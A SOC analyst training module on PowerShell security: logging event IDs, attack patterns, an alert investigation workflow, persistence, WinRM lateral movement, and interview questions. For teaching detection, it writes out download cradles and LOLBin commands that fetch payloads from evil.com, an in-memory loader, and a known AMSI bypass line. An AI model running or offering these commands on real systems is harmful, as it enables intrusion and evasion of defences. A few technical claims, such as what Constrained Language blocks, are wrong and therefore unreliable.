# Module 6: PowerShell Security

**Priority: P0 — #1 attack vector. L1 must investigate PS alerts daily.**

---

## 6.1 PowerShell Basics for SOC

### What is PowerShell?
- **Task automation framework** built on .NET
- **Command-line shell** + **Scripting language**
- **Object-oriented pipeline** (not text like Bash)
- **Full access** to .NET, WMI, COM, WinRM, CIM, REST APIs
- **Default on Windows 7+**, Windows Server 2008 R2+

### PowerShell Versions (Matters for Logging)
| Version | Engine | Default On | Logging Capability |
|---------|--------|------------|-------------------|
| **2.0** | v2 | Win7/2008R2 | Minimal (no Script Block Logging) |
| **3.0** | v3 | Win8/2012 | Module Logging only |
| **4.0** | v4 | 8.1/2012R2 | Module Logging |
| **5.0/5.1** | v5 | Win10/2016 | **Script Block Logging, Module Logging, AMSI** |
| **6.0+ (Core)** | v6+ | Cross-platform | Script Block Logging, no AMSI (yet) |

**Attackers love v2** (downgrade attack: `powershell -version 2` bypasses v5 logging/AMSI).

---

## 6.2 PowerShell Execution Flow

```
User Input / Script
        │
        ▼
┌───────────────────┐
│   Parser          │  →  AST (Abstract Syntax Tree)
└─────────┬─────────┘
          │
          ▼
┌───────────────────┐
│   Compiler        │  →  IL (Intermediate Language) / DynamicMethod
└─────────┬─────────┘
          │
          ▼
┌───────────────────┐
│   Runtime (CLR)   │  →  Execution
│   + AMSI Hook     │     (Scan here if enabled)
└───────────────────┘
```

**Key Insight**: Everything is .NET. Reflection, `Invoke-Expression`, `Add-Type`, `[System.Reflection.Assembly]::Load()` all execute in-memory.

---

## 6.3 PowerShell Logging — The SOC Visibility Triad

### 1. Module Logging (Event ID 4103)
**What**: Logs pipeline execution (commands, parameters)
**Where**: `Microsoft-Windows-PowerShell/Operational`
**Enable**: GPO → Administrative Templates → Windows Components → Windows PowerShell → Turn on Module Logging → `*`
**Volume**: High (every command)
**Value**: See *what ran*, but not full script content

### 2. Script Block Logging (Event ID 4104) — **CRITICAL**
**What**: Logs *entire script block* content (deobfuscated!)
**Where**: `Microsoft-Windows-PowerShell/Operational`
**Enable**: GPO → Turn on PowerShell Script Block Logging → Enable
**Volume**: Medium (per script block)
**Value**: **Sees through obfuscation** — logs *after* parsing, *before* execution

### 3. Transcription (Text File)
**What**: Full session transcript (input + output)
**Where**: File share (configured via GPO)
**Enable**: GPO → Turn on PowerShell Transcription
**Volume**: High (text files)
**Value**: Complete session replay, but file-based (not SIEM-friendly)

### 4. AMSI (Antimalware Scan Interface)
**What**: Real-time scanning of *in-memory* content (scripts, .NET assemblies, COM)
**Where**: Integrated with Defender / AV
**Enable**: Default on Win10+ with Defender
**Value**: **Catches fileless malware**, reflective loading, `IEX`, `[Assembly]::Load()`

---

## 6.4 Event ID 4104 — Script Block Logging Deep Dive

**This is your best friend. It shows the *deobfuscated* script.**

```
Key Fields:
├── EventID: 4104
├── ContextInfo:  (script name, path, or "Command line")
├── ScriptBlockText:  THE FULL DEOBFUSCATED CODE
├── ScriptBlockId:    GUID (correlate across events)
├── Path:             Script file path (if file)
├── User:             DOMAIN\user
├── Computer:
├── Level:            Warning (suspicious) / Information (normal)
├── Opcode:           Execute / Create / Close
└── Message:          "Creating Scriptblock text (1 of 1):\n<code>"
```

**Why it defeats obfuscation**:
```
Attacker sends:  powershell -enc "JABjAGwAaQA..."  (Base64 encoded)
4104 logs:       $client = New-Object Net.WebClient; $client.DownloadString('http://evil.com/payload')
```
The engine decodes, parses, *then* logs. You see the truth.

---

## 6.5 Common Attack Patterns in PowerShell

### 1. Encoded Commands (`-enc` / `-encodedCommand`)
```
Base64(UTF-16LE) of the command string.
Decoding:
  $encoded = "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACAAJABjAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEZ..."
  [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
```
**Detection**: `-enc`, `-encodedCommand`, `-e` in command line (4688, Sysmon EID 1, 4104)

### 2. Download Cradles (Remote Code Execution)
```powershell
# Classic
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
IEX (New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe', "$env:TEMP\payload.exe")

# Modern (TLS, bypass)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr -UseBasicParsing 'https://evil.com/payload.ps1')

# One-liners
powershell -c "iwr http://evil.com/p.ps1 | iex"
```
**Detection**: `DownloadString`, `DownloadFile`, `DownloadData`, `OpenRead`, `Invoke-WebRequest` (iwr), `Invoke-RestMethod` (irm), `Net.WebClient`, `System.Net.Http.HttpClient`

### 3. Obfuscation Techniques
| Technique | Example | Defeated By |
|-----------|---------|-------------|
| **String concatenation** | `'Down'+'load'+'String'` | 4104 (logs concatenated) |
| **Variable substitution** | `$a='DownloadString'; $client.$a()` | 4104 |
| **Format operator** | `-f "Download{0}" "String"` | 4104 |
| **Character escaping** | `Do``wn`l`o`adString` | 4104 |
| **Base64 encoding** | `-enc JABjAGwA...` | 4104 (decodes first) |
| **Compression** | `[IO.Compression.GzipStream]...` | 4104 (decompresses) |
| **AST manipulation** | `[ScriptBlock]::Create(...)` | 4104 (logs result) |
| **Invoke-Expression (IEX)** | `IEX $obfuscated` | 4104 (logs expanded) |

**Key Rule**: **Script Block Logging (4104) defeats almost all script-level obfuscation.** It logs *after* the parser resolves everything.

### 4. Living-off-the-Land Binaries (LOLBins) via PowerShell
```powershell
# Certutil
certutil -decode /split bad.b64 bad.exe
certutil -urlcache -split -f http://evil.com/payload.exe bad.exe

# Mshta
mshta http://evil.com/payload.hta
mshta vbscript:Execute("...")

# Regsvr32
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll

# Rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://evil.com/payload.sct")

# InstallUtil
InstallUtil /logfile= /LogToConsole=false /U evil.dll

# MSBuild
msbuild.exe evil.csproj
```
**Detection**: Process tree (4688/Sysmon) showing PowerShell → LOLBin, or LOLBin with network connections.

### 5. Reflective Loading / Fileless Execution
```powershell
# Load .NET assembly from memory (bytes)
$bytes = (iwr http://evil.com/payload.bin).Content
[System.Reflection.Assembly]::Load($bytes)
[Payload.Class]::Main()

# Load unmanaged DLL (DLL injection)
[System.Reflection.Assembly]::Load([IO.File]::ReadAllBytes("C:\Windows\System32\amsi.dll"))
```
**Detection**: AMSI (catches at load), 4104 (sees `[Assembly]::Load`), Sysmon EID 7 (Image Load), EID 8 (CreateRemoteThread)

### 6. AMSI Bypass (Public Techniques — All Patched/Detected)
```powershell
# Memory patch (old)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Reflection (detected)
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(100)
# ... patch AmsiScanBuffer in memory
```
**Detection**: AMSI event logs, Defender alerts, 4104 (sees the bypass code), behavior (script runs after bypass attempt)

---

## 6.6 PowerShell Investigation Workflow for L1

### Alert: "Suspicious PowerShell - Encoded Command"
```
1. GET COMMAND LINE (4688 / Sysmon EID 1)
   → powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACAA...

2. DECODE (CyberChef, PowerShell, base64 -d)
   → $client = New-Object Net.WebClient; $client.DownloadString('http://malicious.com/payload.ps1')

3. CHECK 4104 (Script Block Logging)
   → Event 4104 shows SAME deobfuscated code + ScriptBlockId

4. CHECK NETWORK (Sysmon EID 3 / Proxy / Firewall)
   → Process: powershell.exe → Destination: malicious.com:443 → TLS handshake → Data transfer

5. CHECK FILE SYSTEM (Sysmon EID 11 / EDR)
   → %TEMP%\payload.ps1 created? Hash? VT?

6. CHECK PROCESS TREE
   → Parent: WINWORD.EXE (Phishing) / CMD.EXE / EXPLORER.EXE / SERVICES.EXE

7. THREAT INTEL
   → Domain: malicious.com (registered 2 days ago, Namecheap, bulletproof hosting)
   → IP: 203.0.113.45 (VT: 15/92 Cobalt Strike C2)

8. CLASSIFY
   → TRUE POSITIVE: Phishing → Macro → Encoded PS → Download → C2
   → MITRE: T1059.001, T1105, T1071.001, T1055
   → ESCALATE P2
```

---

## 6.7 PowerShell Profile & Persistence

### Profiles (Auto-run on PS start)
| Profile | Path | Scope |
|---------|------|-------|
| All Users, All Hosts | `$PSHOME\Profile.ps1` | System-wide |
| All Users, Current Host | `$PSHOME\Microsoft.PowerShell_profile.ps1` | System-wide, host-specific |
| Current User, All Hosts | `$HOME\Documents\PowerShell\Profile.ps1` | User-wide |
| Current User, Current Host | `$HOME\Documents\PowerShell\Microsoft.PowerShell_profile.ps1` | User, host-specific |

**Attack**: Write malicious code to profile → executes every PS session.
**Detection**: File create (Sysmon EID 11) on profile paths, 4104 on profile load.

### Other Persistence
- **WMI Event Subscription** (Sysmon EID 19/20/21) → `powershell -enc ...`
- **Scheduled Task** (4698) → Action: `powershell.exe -file ...`
- **Registry Run Keys** (Sysmon EID 13) → `powershell -windowstyle hidden ...`
- **Services** (7045) → `powershell.exe -noprofile -command ...`
- **Shortcut (.lnk) modification** → Target: `powershell ...`

---

## 6.8 PowerShell Remoting (WinRM) — Lateral Movement

### Protocols
- **WinRM (5985 HTTP, 5986 HTTPS)** — SOAP over HTTP
- **SSH Remoting (PS 6+)** — SSH transport

### Common Lateral Commands
```powershell
# Enter-PSSession (interactive)
Enter-PSSession -ComputerName TARGET -Credential $cred

# Invoke-Command (non-interactive, most common for lateral)
Invoke-Command -ComputerName TARGET -ScriptBlock { whoami } -Credential $cred

# New-PSSession (persistent)
$s = New-PSSession -ComputerName TARGET
Invoke-Command -Session $s -ScriptBlock { ... }

# WinRM config (enable on target)
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
```

### Detection
| Source | Indicator |
|--------|-----------|
| **4624** | Logon Type 3 (Network) from remote, Account: admin/user |
| **4688 / Sysmon** | `wsmprovhost.exe` (WinRM host process) spawning children |
| **NDR** | TCP 5985/5986 between workstations (not management server) |
| **4104** | Script blocks with `Invoke-Command`, `Enter-PSSession`, `New-PSSession` |
| **WinRM Logs** | `Microsoft-Windows-WinRM/Operational` — connection details |

---

## 6.9 Constrained Language Mode & JEA

### Language Modes
| Mode | Capabilities | Use Case |
|------|--------------|----------|
| **FullLanguage** | All .NET, COM, WMI, unrestricted | Admin, interactive |
| **ConstrainedLanguage** | Limited .NET (allowlist), no `Add-Type`, `[Reflection]`, `Invoke-Expression` | **AppLocker, WDAC, JEA** |
| **RestrictedLanguage** | Only basic commands, no scripts | Kiosk |
| **NoLanguage** | No commands | Lockdown |

**Constrained Language** blocks: `IEX`, `[Assembly]::Load`, `Add-Type`, `[Reflection]`, `Get-Process`, `Stop-Process`, COM, WMI (mostly).

**JEA (Just Enough Administration)**: Constrained endpoints + role-based commands. Users connect to restricted endpoint, run only approved functions.

---

## 6.10 PowerShell 7+ (Core) Differences

| Feature | Windows PS 5.1 | PowerShell 7+ |
|---------|----------------|---------------|
| **Runtime** | .NET Framework | .NET Core / .NET 6+ |
| **Default Path** | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | `C:\Program Files\PowerShell\7\pwsh.exe` |
| **Module Path** | `PSModulePath` (system) | `PSModulePath` (user + system) |
| **Profile** | `$PROFILE` (Documents) | `$PROFILE` (Documents/PowerShell) |
| **AMSI** | Full | Full (since 7.2) |
| **Script Block Logging** | Yes | Yes |
| **Transcription** | Yes | Yes |
| **Remoting** | WinRM | WinRM + SSH |
| **Cross-platform** | No | Yes (Linux, macOS) |

**Detection**: `pwsh.exe` process name, different paths, SSH remoting (port 22).

---

## 6.11 Interview Questions for This Module

1. **What are the three PowerShell logging sources and which defeats obfuscation?**
   - Module Logging (4103), Script Block Logging (4104), Transcription. **4104 defeats obfuscation** — logs after parsing.

2. **How does Base64 encoded command (`-enc`) work and how do you decode it?**
   - UTF-16LE string → Base64. Decode: `[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($enc))`.

3. **What is a "download cradle" and give 3 examples.**
   - One-liner to download and execute remote code. Examples: `IEX (iwr url)`, `(New-Object Net.WebClient).DownloadString(url)`, `irm url | iex`.

4. **How does Script Block Logging (4104) defeat string concatenation obfuscation?**
   - Parser resolves concatenation (`'Down'+'load'`) into single string *before* logging. 4104 shows `DownloadString`.

5. **What is AMSI and what does it scan?**
   - Antimalware Scan Interface. Scans in-memory content: scripts, .NET assemblies, COM objects, before execution.

6. **What process indicates PowerShell Remoting / WinRM lateral movement?**
   - `wsmprovhost.exe` (WinRM host process) on target machine, spawning child processes.

7. **Name 5 PowerShell LOLBins and how they're abused.**
   - Certutil (decode/download), Mshta (HTA execution), Regsvr32 (SCT), Rundll32 (JS/COM), InstallUtil/MSBuild (bypass AppLocker).

8. **What is Constrained Language Mode and what does it block?**
   - Restricted mode: blocks `IEX`, `Add-Type`, `[Reflection]`, `[Assembly]::Load`, COM, WMI, process manipulation.

9. **How do you detect PowerShell profile persistence?**
   - File create (Sysmon EID 11) on profile paths (`$PROFILE`, `$PSHOME\Profile.ps1`), 4104 on PS startup showing profile content.

10. **Difference between Windows PowerShell 5.1 and PowerShell 7+ for detection?**
    - Different binary (`pwsh.exe`), path (`Program Files\PowerShell\7`), cross-platform, SSH remoting, .NET Core runtime.

---

## 6.12 Study Checklist for Module 6

- [ ] Explain PowerShell execution flow (Parser → Compiler → Runtime + AMSI)
- [ ] Configure and explain 3 logging sources (Module, Script Block, Transcription)
- [ ] Decode Base64 encoded command (UTF-16LE)
- [ ] Identify 5 download cradle variants
- [ ] Explain how 4104 defeats: concatenation, variables, format operator, encoding, compression
- [ ] List 8 LOLBins executed via PowerShell
- [ ] Describe reflective loading / fileless execution detection (AMSI, 4104, Sysmon)
- [ ] Investigate end-to-end: Encoded command alert → decode → 4104 → network → file → tree → TI → classify
- [ ] Explain WinRM lateral movement detection (wsmprovhost, 4624 Type 3, 5985/5986)
- [ ] Differentiate FullLanguage vs ConstrainedLanguage vs JEA
- [ ] Answer all 10 interview questions without notes

---

*Next: Module 7 — Active Directory*